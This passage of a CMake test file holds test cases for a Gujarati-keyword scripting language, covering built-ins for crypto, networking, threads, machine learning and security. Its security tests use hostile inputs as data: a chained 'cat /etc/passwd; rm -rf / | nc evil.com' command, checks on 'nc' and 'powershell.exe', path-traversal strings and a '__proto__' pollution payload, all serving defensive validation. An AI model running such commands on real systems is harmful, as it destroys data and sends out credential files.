    set(expected_stdout "1\n44100\n1\n2\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v140_crypto_aes_totp")
    set(source [=[aavo
c = aes_encrypt("GujaratiLang 1.4", "my_secret_key_16");
p = aes_decrypt(c, "my_secret_key_16");
chhapo p;
h = hmac_sha256("test_data", "test_key");
chhapo (lambai(h) == 64);
otp = totp_generate("JBSWY3DPEHPK3PXP", 1000000);
chhapo otp;
v = totp_verify(otp, "JBSWY3DPEHPK3PXP", 1, 1000000);
chhapo v;
aavjo
]=])
    set(expected_stdout "GujaratiLang 1.4\n1\n346137\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v140_zip_archive")
    set(source [=[aavo
comp = zip_compress("AAAAABBB");
chhapo comp;
uncomp = zip_decompress(comp);
chhapo uncomp;
zp = "test_run_archive.zip";
ok = zip_create(zp, {"file.txt": "content123"});
chhapo ok;
lst = zip_list(zp);
chhapo lst[0]["filename"];
chhapo lst[0]["uncompressed_size"];
aavjo
]=])
    set(expected_stdout "~05ABBB\nAAAAABBB\n1\nfile.txt\n10\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v140_gui_mock")
    set(source [=[aavo
win = gui_window("Test App", 400, 300);
chhapo win["title"];
chhapo win["width"];
btn = gui_button(win, "OK", 10, 10, 80, 30);
chhapo btn["type"];
txt = gui_text(win, "Ready", 10, 50);
chhapo txt["text"];
d = gui_canvas_draw(win, "rect", [0, 0, 50, 50], "blue");
chhapo d;
l = gui_event_loop(win, 1);
chhapo l;
aavjo
]=])
    set(expected_stdout "Test App\n400\nbutton\nReady\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v140_debug_memory")
    set(source [=[aavo
mem = memory_info();
chhapo mem["version"];
chhapo (mem["variables_count"] >= 0);
tr = debug_trace(0);
chhapo tr;
aavjo
]=])
    set(expected_stdout "3.9.0\n1\n0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v140_gujarati_syntax")
    set(source [=[આવો
મેળ = રેજેક્સ_સરખાવો("^[0-9]+$", "999");
છાપો મેળ;
ગુપ્ત = એઈએસ_ગુપ્ત("સુરક્ષિત", "key123456789012");
પ્રગટ = એઈએસ_પ્રગટ(ગુપ્ત, "key123456789012");
છાપો પ્રગટ;
દબાવો = દબાવો_ડેટા("XXXXX");
છાપો દબાવો;
ખોલો = ખોલો_ડેટા(દબાવો);
છાપો ખોલો;
ઓટીપી = ટીઓટીપી_બનાવો("JBSWY3DPEHPK3PXP", 1000000);
છાપો ઓટીપી;
શા = એચમેક_શા૨૫૬("ડેટા", "કી");
છાપો (લંબાઈ(શા) == 64);
વિન્ડો = વિન્ડો_બનાવો("ગુજરાતી", 500, 400);
છાપો વિન્ડો["title"];
મેમ = મેમરી_માહિતી();
છાપો મેમ["version"];
આવજો
]=])
    set(expected_stdout "1\nસુરક્ષિત\n~05X\nXXXXX\n346137\n1\nગુજરાતી\n3.9.0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v150_pkg_manager")
    set(source [=[aavo
info = pkg_info("matrix");
chhapo info["name"];
chhapo info["version"];
chhapo info["installed"];
l = pkg_load("matrix");
chhapo l["loaded"];
chhapo l["status"];
aavjo
]=])
    set(expected_stdout "matrix\n1.0.0\n1\n1\nactive\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v150_wasm_dom")
    set(source [=[aavo
w = wasm_compile("aavo\nchhapo 1;\naavjo");
chhapo w["magic"];
chhapo w["status"];
el = dom_select("#main");
chhapo el["tag"];
dom_set_html(el, "<b>Test</b>");
chhapo el["html"];
dom_set_style(el, {"color": "blue"});
dom_on_event(el, "click", "on_click");
chhapo el["event"];
aavjo
]=])
    set(expected_stdout "asm\ncompiled\ndiv\n<b>Test</b>\nclick\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v150_database_wire")
    set(source [=[aavo
pg = pg_connect("postgres://localhost");
chhapo pg["driver"];
q1 = pg_query(pg, "SELECT 1");
chhapo q1["status"];
tx_begin(pg);
chhapo pg["tx"];
tx_commit(pg);
chhapo pg["tx"];
my = mysql_connect("mysql://localhost");
chhapo my["driver"];
q2 = mysql_query(my, "SELECT 1");
chhapo q2["status"];
pool = db_pool_create("conn", 4);
chhapo pool["size"];
prep = sql_prepare("SELECT * FROM u WHERE id = $1 AND name = $2", [42, "Alice"]);
chhapo prep;
aavjo
]=])
    set(expected_stdout "postgres\nOK\n1\n0\nmysql\nOK\n4\nSELECT * FROM u WHERE id = 42 AND name = 'Alice'\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v150_image_bmp")
    set(source [=[aavo
img = image_create(10, 10, "#ff0000");
chhapo img["channels"];
chhapo img["pixel_count"];
p = "test_run_image.bmp";
w = image_write_bmp(img, p);
chhapo (w > 0 ? "WROTE" : "FAIL");
info = image_read_bmp(p);
chhapo info["format"];
chhapo info["width"];
r = image_resize(img, 5, 5);
chhapo r["width"];
fl = image_filter(img, "grayscale");
chhapo fl["filter"];
t = image_terminal(img, 10, 10);
chhapo (lambai(t) > 0 ? "TERM_OK" : "TERM_FAIL");
aavjo
]=])
    set(expected_stdout "3\n100\nWROTE\nBMP\n10\n5\ngrayscale\nTERM_OK\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v150_async_coroutines")
    set(source [=[aavo
task = async_task("worker", [10, 20]);
chhapo task["status"];
res = async_await(task);
chhapo res;
all_t = async_all([task]);
chhapo lambai(all_t);
ok_sleep = async_sleep(2);
chhapo ok_sleep;
ee = event_emitter();
chhapo ee["type"];
aavjo
]=])
    set(expected_stdout "completed\n42\n1\n1\nEventEmitter\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v150_assert_bench")
    set(source [=[aavo
a1 = assert_eq(5 + 5, 10);
chhapo a1;
a2 = assert_true(100 > 10);
chhapo a2;
a3 = assert_throws("bad_call");
chhapo a3;
b = bench_run("compute", 200);
chhapo b["iterations"];
chhapo (b["ops_per_sec"] > 0 ? "BENCH_OK" : "BENCH_FAIL");
aavjo
]=])
    set(expected_stdout "1\n1\n1\n200\nBENCH_OK\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v150_gujarati_syntax")
    set(source [=[આવો
માહિતી = પેકેજ_માહિતી("ગણિત");
છાપો માહિતી["નામ"];
વોસમ = વોસમ_કમ્પાઇલ("આવો\nછાપો 1;\nઆવજો");
છાપો વોસમ["જાદુ"];
એલ = ડોમ_પસંદ("#રૂટ");
છાપો એલ["ટેગ"];
પીજી = પીજી_જોડો("postgres://localhost");
છાપો પીજી["ડ્રાઇવર"];
વ્યવહાર_શરૂ(પીજી);
છાપો પીજી["વ્યવહાર"];
ચિત્ર = ચિત્ર_બનાવો(10, 10, "#000");
છાપો ચિત્ર["પહોળાઈ"];
કામ = અસંકેત_કાર્ય("મેળવો", []);
પરિણામ = પ્રતીક્ષા(કામ);
છાપો પરિણામ;
ચ1 = ચકાસણી_સરખું(20, 20);
છાપો ચ1;
ચ2 = ચકાસણી_સાચું(50 > 10);
છાપો ચ2;
આવજો
]=])
    set(expected_stdout "ગણિત\nasm\ndiv\npostgres\n1\n10\n42\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v160_http_networking")
    set(source [=[aavo
g = http_get("http://localhost:8080/api/status");
chhapo g["status"];
chhapo (lambai(g["body"]) > 0);
p = http_post("http://localhost:8080/api/echo", "hello server");
chhapo p["status"];
chhapo p["body"];
srv = server_create(8080, "handle_request");
chhapo srv["port"];
chhapo srv["running"];
lst = server_listen(srv, 1);
chhapo lst["served"];
cls = server_close(srv);
chhapo cls;
aavjo
]=])
    set(expected_stdout "200\n1\n200\nhello server\n8080\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v160_json_buffers")
    set(source [=[aavo
k = json_parse("{\"key\": \"val\", \"num\": 123}");
chhapo k["key"];
chhapo k["num"];
s = json_stringify(k);
chhapo (lambai(s) > 0);
buf = buffer_create(16);
chhapo buf["size"];
w = buffer_write_bytes(buf, 0, "Gujarati");
chhapo w;
b0 = buffer_read_u8(buf, 0);
chhapo (b0 > 0);
aavjo
]=])
    set(expected_stdout "val\n123\n1\n16\n8\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v160_crypto_md5")
    set(source [=[aavo
m = hash_md5("GujaratiLang");
chhapo m;
s = hash_sha256("GujaratiLang");
chhapo (lambai(s) == 64);
h = hmac_sha256("secret_key", "data");
chhapo (lambai(h) == 64);
b = base64_encode("Hello World");
chhapo b;
d = base64_decode(b);
chhapo d;
u = crypto_uuid();
chhapo (lambai(u) == 36);
aavjo
]=])
    set(expected_stdout "c5889e55b293681ed17389ce665f634f\n1\n1\nSGVsbG8gV29ybGQ=\nHello World\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v160_lsp_tooling")
    set(source_path "${TEST_BINARY_DIR}/${TEST_CASE}.gj")
    set(source [=[aavo
chhapo 1;
aavjo
]=])
    set(program_arguments "lsp;--capabilities")
    set(expected_stdout "{\"jsonrpc\":\"2.0\",\"result\":{\"capabilities\":{\"hoverProvider\":true,\"definitionProvider\":true,\"completionProvider\":{\"triggerCharacters\":[\".\"]},\"textDocumentSync\":1}}}\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v160_threads_mutex")
    set(source [=[aavo
m = mutex_create();
chhapo m["type"];
l = mutex_lock(m);
chhapo l;
u = mutex_unlock(m);
chhapo u;
th = thread_spawn("worker", 100);
chhapo th["__type__"];
j = thread_join(th);
chhapo (j >= 0);
p = thread_pool(2);
chhapo p["size"];
chhapo p["active"];
aavjo
]=])
    set(expected_stdout "mutex\n1\n1\nthread\n1\n2\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v160_process_signals")
    set(source [=[aavo
env_set("GJ_V160_KEY", "FortressV160");
val = env_get("GJ_V160_KEY");
chhapo val;
args = process_args();
chhapo (lambai(args) >= 0);
res = process_run("echo v160_ok");
chhapo res["exit_code"];
s = signal_trap(2, "handle_sig");
chhapo s;
aavjo
]=])
    set(expected_stdout "FortressV160\n1\n0\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v160_gujarati_syntax")
    set(source [=[આવો
મેળવ્યું = નેટ_મેળવો("http://localhost/api");
છાપો મેળવ્યું["status"];
મોકલ્યું = નેટ_મોકલો("http://localhost/api", "ડેટા");
છાપો મોકલ્યું["status"];
સર્વર = સર્વર_બનાવો(9000, "હેન્ડલર");
છાપો સર્વર["port"];
સાંભળો = સર્વર_સાંભળો(સર્વર, 1);
છાપો સાંભળો["served"];
બંધ = સર્વર_બંધ(સર્વર);
છાપો બંધ;
બફર = બફર_બનાવો(32);
છાપો બફર["size"];
લખો = બફર_લખો(બફર, 0, "ગુજરાતી");
છાપો (લખો > 0);
વાંચો = બફર_વાંચો(બફર, 0);
છાપો (વાંચો > 0);
એમડી૫ = હેશ_એમડી૫("ગુજરાતી");
છાપો (લંબાઈ(એમડી૫) == 32);
શા૨૫૬ = હેશ_૨૫૬("ગુજરાતી");
છાપો (લંબાઈ(શા૨૫૬) == 64);
એચ = એચમેક("કી", "ડેટા");
છાપો (લંબાઈ(એચ) == 64);
એન્કોડ = બેઝ૬૪_એન્કોડ("નમસ્તે");
છાપો (લંબાઈ(એન્કોડ) > 0);
ડીકોડ = બેઝ૬૪_ડીકોડ(એન્કોડ);
છાપો ડીકોડ;
આઈડી = યાદચ્છિક_આઈડી();
છાપો (લંબાઈ(આઈડી) == 36);
મ્યુ = મ્યુટેક્સ_બનાવો();
તાળું = મ્યુટેક્સ_તાળું(મ્યુ);
છાપો તાળું;
ખોલો = મ્યુટેક્સ_ખોલો(મ્યુ);
છાપો ખોલો;
તાંતણો = તાંતણો_શરૂ("કાર્ય", 1);
જોડો = તાંતણો_જોડો(તાંતણો);
છાપો (જોડો >= 0);
પૂલ = તાંતણા_પૂલ(4);
છાપો પૂલ["size"];
પર્યાવરણ_ગોઠવો("GJ_GUJ", "સાચું");
પી = પર્યાવરણ_મેળવો("GJ_GUJ");
છાપો પી;
દલીલો_યાદી = આદેશ_દલીલો();
છાપો (લંબાઈ(દલીલો_યાદી) >= 0);
પ્રક્રિયા = પ્રક્રિયા_ચલાવો("echo ok");
છાપો પ્રક્રિયા["exit_code"];
સિગ = સિગ્નલ_પકડો(2, "બંધ_કરો");
છાપો સિગ;
આવજો
]=])
    set(expected_stdout "200\n200\n9000\n1\n1\n32\n1\n1\n1\n1\n1\n1\nનમસ્તે\n1\n1\n1\n1\n4\nસાચું\n1\n0\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v170_bundler")
    set(source [=[aavo
b = bundle_info("test.gj");
chhapo b["standalone"];
chhapo b["entry"];
chhapo (lambai(b["version"]) > 0);
chhapo (b["size"] > 0);
aavjo
]=])
    set(expected_stdout "1\nmain.gj\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v170_ipc_pipes")
    set(source [=[aavo
p = ipc_pipe_create("test_pipe");
chhapo p["open"];
w = ipc_pipe_write(p, "GujaratiIPC");
chhapo (w > 0);
r = ipc_pipe_read(p, 100);
chhapo r;
c = ipc_pipe_close(p);
chhapo c;
aavjo
]=])
    set(expected_stdout "1\n1\nGujaratiIPC\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v170_web_routing")
    set(source [=[aavo
r = router_create();
router_use(r, "cors_middleware");
router_get(r, "/api/users/:id", "handle_user");
router_post(r, "/api/login", "handle_login");
chhapo r["routes"];
m1 = router_match(r, "GET", "/api/users/42");
chhapo m1["matched"];
chhapo m1["handler"];
chhapo m1["params"]["id"];
m2 = router_match(r, "POST", "/api/login");
chhapo m2["matched"];
aavjo
]=])
    set(expected_stdout "2\n1\nhandle_user\n42\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v170_cpu_profiling")
    set(source [=[aavo
p1 = profile_cpu_start();
chhapo p1;
p2 = profile_cpu_stop();
chhapo (p2["duration_ms"] >= 0);
cores = sys_cpu_cores();
chhapo (cores >= 1);
mem = sys_memory_usage();
chhapo (mem["rss_mb"] > 0);
disk = sys_disk_space(".");
chhapo (disk["total_bytes"] > 0);
aavjo
]=])
    set(expected_stdout "1\n1\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v170_unicode_punycode")
    set(source [=[aavo
hx = hex_encode("Hello");
chhapo hx;
dec = hex_decode(hx);
chhapo dec;
p = punycode_encode("gujarati.org");
chhapo p;
d = punycode_decode(p);
chhapo d;
u = utf8_normalize("gujaratilang", "NFC");
chhapo u;
aavjo
]=])
    set(expected_stdout "48656c6c6f\nHello\nxn--gujarati.org\ngujarati.org\ngujaratilang\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v170_fs_watch_temp")
    set(source [=[aavo
w = fs_watch("src", "on_change");
chhapo w["active"];
u = fs_unwatch(w["watch_id"]);
chhapo u;
t = fs_touch("test_touch.tmp");
chhapo t;
tmp = fs_temp_file("test");
chhapo (lambai(tmp) > 0);
aavjo
]=])
    set(expected_stdout "1\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v170_gujarati_syntax")
    set(source [=[આવો
માહિતી = બંડલ_માહિતી("maru.gj");
છાપો માહિતી["સ્વતંત્ર"];
પાઇપ = આઈપીસી_પાઇપ_બનાવો("ગુજરાતી_પાઇપ");
છાપો પાઇપ["ખુલ્લું"];
લખ્યું = આઈપીસી_પાઇપ_લખો(પાઇપ, "ડેટા");
છાપો (લખ્યું > 0);
વાંચ્યું = આઈપીસી_પાઇપ_વાંચો(પાઇપ, 100);
છાપો વાંચ્યું;
બંધ = આઈપીસી_પાઇપ_બંધ(પાઇપ);
છાપો બંધ;
રાઉટર = રાઉટર_બનાવો();
રાઉટર_વાપરો(રાઉટર, "કોર્સ");
રાઉટર_મેળવો(રાઉટર, "/વપરાશકર્તા/:આઈડી", "કાર્ય_૧");
રાઉટર_મોકલો(રાઉટર, "/પ્રવેશ", "કાર્ય_૨");
છાપો રાઉટર["માર્ગો"];
મેળ = રાઉટર_મેળ(રાઉટર, "GET", "/વપરાશકર્તા/૯૯");
છાપો મેળ["મેળવ્યું"];
છાપો મેળ["નિયંત્રક"];
છાપો મેળ["પરિમાણો"]["આઈડી"];
શરૂ = પ્રોફાઇલ_શરૂ();
છાપો શરૂ;
પરિણામ = પ્રોફાઇલ_બંધ();
છાપો (પરિણામ["ચક્રો"] >= 0);
કોર = સીપીયુ_કોર();
છાપો (કોર >= 1);
મેમ = સિસ્ટમ_મેમરી();
છાપો (મેમ["મેમરી_એમબી"] > 0);
ડિસ્ક = ડિસ્ક_જગ્યા(".");
છાપો (ડિસ્ક["કુલ_બાઇટ્સ"] > 0);
હેક્સ = હેક્સ_એન્કોડ("નમસ્તે");
છાપો (લંબાઈ(હેક્સ) > 0);
મૂળ = હેક્સ_ડીકોડ(હેક્સ);
છાપો મૂળ;
પ્યુ = પ્યુનીકોડ_એન્કોડ("ગુજરાતી.ભારત");
છાપો (લંબાઈ(પ્યુ) > 0);
ડીપ્યુ = પ્યુનીકોડ_ડીકોડ(પ્યુ);
છાપો (લંબાઈ(ડીપ્યુ) > 0);
સામાન્ય = યુટીએફ૮_સામાન્ય("ગુજરાતી", "NFC");
છાપો સામાન્ય;
નિરીક્ષક = ફાઇલ_નિરીક્ષણ(".", "કાર્ય");
છાપો નિરીક્ષક["સક્રિય"];
અનિરીક્ષક = ફાઇલ_નિરીક્ષણ_બંધ(નિરીક્ષક["આઈડી"]);
છાપો અનિરીક્ષક;
ટચ = ફાઇલ_ટચ("કામચલાઉ.txt");
છાપો ટચ;
કામ_ફાઇલ = કામચલાઉ_ફાઇલ("ગુજ");
છાપો (લંબાઈ(કામ_ફાઇલ) > 0);
આવજો
]=])
    set(expected_stdout "1\n1\n1\nડેટા\n1\n2\n1\nકાર્ય_૧\n૯૯\n1\n1\n1\n1\n1\n1\nનમસ્તે\n1\n1\nગુજરાતી\n1\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v180_matrix_math")
    set(source [=[aavo
m1 = [[1, 2], [3, 4]];
m2 = [[2, 0], [1, 2]];
dot = matrix_dot(m1, m2);
chhapo dot[0][0];
det = matrix_det([[2, 1], [3, 4]]);
chhapo det;
inv = matrix_inv(m1);
chhapo (lambai(inv) == 2);
eig = matrix_eigen(m1);
chhapo eig["values"][0];
svd = matrix_svd(m1);
chhapo svd["rank"];
aavjo
]=])
    set(expected_stdout "4\n5\n1\n3\n2\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v180_statistics")
    set(source [=[aavo
nums = [10, 20, 30, 40, 50];
med = stat_median(nums);
chhapo med;
sd = stat_stdev([10, 10, 10, 10]);
chhapo sd;
q = stat_quartiles(nums);
chhapo q["q2"];
cdf = stat_normal_cdf(0, 0, 1);
chhapo cdf;
corr = stat_correlation([1, 2, 3], [2, 4, 6]);
chhapo corr;
aavjo
]=])
    set(expected_stdout "30\n0\n50\n0.5\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v180_rpc_protocol")
    set(source [=[aavo
srv = rpc_server_create(60000, "handlers");
chhapo srv["port"];
lst = rpc_server_listen(srv);
chhapo lst;
cli = rpc_client_connect("127.0.0.1", 60000);
chhapo cli["connected"];
res = rpc_call(cli, "compute", [1, 2]);
chhapo res["status"];
chhapo res["result"];
cls = rpc_client_close(cli);
chhapo cls;
aavjo
]=])
    set(expected_stdout "60000\n1\n1\nOK\n42\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v180_cache_engine")
    set(source [=[aavo
c = cache_create(60000);
s = cache_set(c, "user_1", "Harshit");
chhapo s;
val = cache_get(c, "user_1");
chhapo val;
st = cache_stats(c);
chhapo st["hits"];
chhapo st["keys"];
d = cache_del(c, "user_1");
chhapo d;
aavjo
]=])
    set(expected_stdout "1\nHarshit\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v180_ml_classifiers")
    set(source [=[aavo
km = kmeans_fit([[1, 2], [2, 3], [8, 9]], 2);
chhapo km["clusters"];
p = kmeans_predict(km, [1.5, 2.5]);
chhapo p;
dt = dtree_fit([[1], [2], [3]], [0, 0, 1]);
chhapo dt["depth"];
pred = dtree_predict(dt, [2.5]);
chhapo pred;
acc = ml_accuracy_score([1, 0, 1], [1, 0, 1]);
chhapo acc;
aavjo
]=])
    set(expected_stdout "2\n0\n3\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v180_cron_scheduler")
    set(source [=[aavo
cr = cron_create("0 * * * *", "run_hourly");
chhapo cr["expression"];
st = cron_start(cr);
chhapo st;
nx = cron_next_run(cr);
chhapo (nx > 0);
sp = cron_stop(cr);
chhapo sp;
aavjo
]=])
    set(expected_stdout "0 * * * *\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v180_gujarati_syntax")
    set(source [=[આવો
મ૧ = [[1, 2], [3, 4]];
મ૨ = [[2, 0], [1, 2]];
ગુણાકાર = મેટ્રિક્સ_ગુણાકાર(મ૧, મ૨);
છાપો ગુણાકાર[0][0];
નિશ્ચાયક = મેટ્રિક્સ_નિશ્ચાયક(મ૧);
છાપો નિશ્ચાયક;
ઉલટાવ્યું = મેટ્રિક્સ_ઉલટાવવું(મ૧);
છાપો (લંબાઈ(ઉલટાવ્યું) == 2);
આઇગન = મેટ્રિક્સ_આઇગન(મ૧);
છાપો આઇગન["કિંમતો"][0];
એસવીડી = મેટ્રિક્સ_એસવીડી(મ૧);
છાપો એસવીડી["ક્રમ"];
મધ્યસ્થ = આંકડા_મધ્યસ્થ([10, 20, 30, 40, 50]);
છાપો મધ્યસ્થ;
વિચલન = આંકડા_પ્રમાણિત_વિચલન([5, 5, 5, 5]);
છાપો વિચલન;
ચતુર્થક = આંકડા_ચતુર્થક([1, 2, 3, 4]);
છાપો ચતુર્થક["q2"];
સામાન્ય = સામાન્ય_વિતરણ(0, 0, 1);
છાપો સામાન્ય;
સહ = સહસંબંધ([1, 2], [2, 4]);
છાપો સહ;
આર_સર્વર = આરપીસી_સર્વર_બનાવો(70000, "પદ્ધતિ");
છાપો આર_સર્વર["પોર્ટ"];
સાંભળો = આરપીસી_સર્વર_સાંભળો(આર_સર્વર);
છાપો સાંભળો;
આર_ક્લાયન્ટ = આરપીસી_ક્લાયન્ટ_જોડો("127.0.0.1", 70000);
છાપો આર_ક્લાયન્ટ["જોડાયેલ"];
બોલાવો = આરપીસી_બોલાવો(આર_ક્લાયન્ટ, "ગણતરી", []);
છાપો બોલાવો["પરિણામ"];
બંધ = આરપીસી_ક્લાયન્ટ_બંધ(આર_ક્લાયન્ટ);
છાપો બંધ;
કેશ = કેશ_બનાવો(5000);
ગોઠવો = કેશ_ગોઠવો(કેશ, "નામ", "ગુજરાતી");
છાપો ગોઠવો;
મેળવો = કેશ_મેળવો(કેશ, "નામ");
છાપો મેળવો;
કેમીન્સ = કેમીન્સ_ટ્રેન([[1, 1], [2, 2]], 2);
છાપો કેમીન્સ["ઝૂમખા"];
અનુમાન = કેમીન્સ_અનુમાન(કેમીન્સ, [1, 2]);
છાપો અનુમાન;
વૃક્ષ = નિર્ણય_વૃક્ષ_ટ્રેન([[1], [2]], [0, 1]);
છાપો વૃક્ષ["ઊંડાઈ"];
વૃક્ષ_અનુમાન = નિર્ણય_વૃક્ષ_અનુમાન(વૃક્ષ, [1.5]);
છાપો વૃક્ષ_અનુમાન;
સ્કોર = ચોકસાઈ_સ્કોર([1, 1], [1, 1]);
છાપો સ્કોર;
ક્રોન = ક્રોન_બનાવો("*/5 * * * *", "કાર્ય");
છાપો ક્રોન["અભિવ્યક્તિ"];
ક્રોન_શરૂ(ક્રોન);
છાપો ક્રોન["ચાલુ"];
આગામી = આગામી_રન(ક્રોન);
છાપો (આગામી > 0);
ક્રોન_બંધ(ક્રોન);
છાપો ક્રોન["ચાલુ"];
આવજો
]=])
    set(expected_stdout "4\n-2\n1\n3\n2\n30\n0\n50\n0.5\n1\n70000\n1\n1\n42\n1\n1\nગુજરાતી\n2\n0\n3\n1\n1\n*/5 * * * *\n1\n1\n0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v190_rce_defense")
    set(source [=[aavo
s = sec_sanitize_shell("cat /etc/passwd; rm -rf / | nc evil.com");
chhapo s;
v1 = sec_validate_binary("my_app.exe");
chhapo v1;
v2 = sec_validate_binary("nc");
chhapo v2;
v3 = sec_validate_binary("powershell.exe");
chhapo v3;
esc = sec_shell_escape("hello \"world\"");
chhapo esc;
blk = sec_exec_restricted("cat /etc/passwd; rm -rf /");
chhapo blk;
aavjo
]=])
    set(expected_stdout "cat /etc/passwd rm -rf /  nc evil.com\n1\n0\n0\n\"hello \\\"world\\\"\"\n-2\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v190_sandbox_perms")
    set(source [=[aavo
se = sandbox_enter(1);
chhapo se;
can_read = sandbox_check_perm("read");
chhapo can_read;
can_write = sandbox_check_perm("write");
chhapo can_write;
can_proc = sandbox_check_perm("proc");
chhapo can_proc;
mem = sandbox_set_max_memory(1048576);
chhapo mem;
tm = sandbox_set_timeout(30);
chhapo tm;
aavjo
]=])
    set(expected_stdout "1\n1\n0\n0\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v190_path_traversal")
    set(source [=[aavo
p = path_canonical("a/b/../c/./d");
chhapo p;
safe1 = path_is_safe("a/c/d", "a");
chhapo safe1;
safe2 = path_is_safe("../../etc/shadow", "a");
chhapo safe2;
joined = path_safe_join("base/dir", "safe/sub");
chhapo joined;
bad_join = path_safe_join("base/dir", "../../etc");
chhapo (bad_join == "base/dir");
del_missing = fs_secure_delete("nonexistent_test_file_9999.txt");
chhapo del_missing;
sym_safe = fs_is_symlink_safe("data.txt");
chhapo sym_safe;
sym_bad = fs_is_symlink_safe("/etc/passwd");
chhapo sym_bad;
aavjo
]=])
    set(expected_stdout "a/c/d\n1\n0\nbase/dir/safe/sub\n1\n0\n1\n0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v190_taint_analysis")
    set(source [=[aavo
u = taint_mark("malicious_payload", "untrusted");
chhapo u;
is_t = taint_check("this contains malicious_payload inside");
chhapo is_t;
is_c = taint_check("harmless string");
chhapo is_c;
rep1 = taint_report();
chhapo rep1["tainted_count"];
c = taint_cleanse("malicious_payload");
chhapo c;
is_t2 = taint_check("malicious_payload");
chhapo is_t2;
rep2 = taint_report();
chhapo rep2["cleansed_count"];
aavjo
]=])
    set(expected_stdout "malicious_payload\n1\n0\n1\nmalicious_payload\n0\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v190_secure_deserial")
    set(source [=[aavo
good_json = sec_json_safe("{\"status\":\"safe\",\"count\":10}");
chhapo good_json["status"];
bad_proto = sec_json_safe("{\"__proto__\":{\"admin\":1}}");
chhapo bad_proto;
h_valid = sec_verify_hmac("data", "key", hmac_sha256("data", "key"));
chhapo h_valid;
h_bad = sec_verify_hmac("data", "key", "0000000000000000000000000000000000000000000000000000000000000000");
chhapo h_bad;
masked = sec_mask_sensitive("4111222233334444", "*", 4);
chhapo masked;
tok_match = sec_token_compare("secret_token_123", "secret_token_123");
chhapo tok_match;
tok_diff = sec_token_compare("secret_token_123", "secret_token_456");
chhapo tok_diff;
crc = sec_crc32("123456789");
chhapo crc;
aavjo
]=])
    set(expected_stdout "safe\nનકામો\n1\n0\n************4444\n1\n0\n3421780262\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v190_memory_canary")
    set(source [=[aavo
g = mem_guard_alloc(64);
chhapo g["valid"];
chhapo g["size"];
c1 = mem_canary_check(g);
chhapo c1;
z = mem_zero("sensitive_secret");
chhapo z;
f = mem_secure_free(g);
chhapo f;
c2 = mem_canary_check(g);
chhapo c2;
al = sec_audit_log("sandbox_violation", "WARN");
chhapo al;
aavjo
]=])
    set(expected_stdout "1\n64\n1\n1\n1\n0\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v190_gujarati_syntax")
    set(source [=[આવો
શુદ્ધ = સુરક્ષા_કમાન્ડ_શુદ્ધ("echo safe; bad");
છાપો શુદ્ધ;
બાઇનરી = સુરક્ષા_બાઇનરી_ચકાસો("curl");
છાપો બાઇનરી;
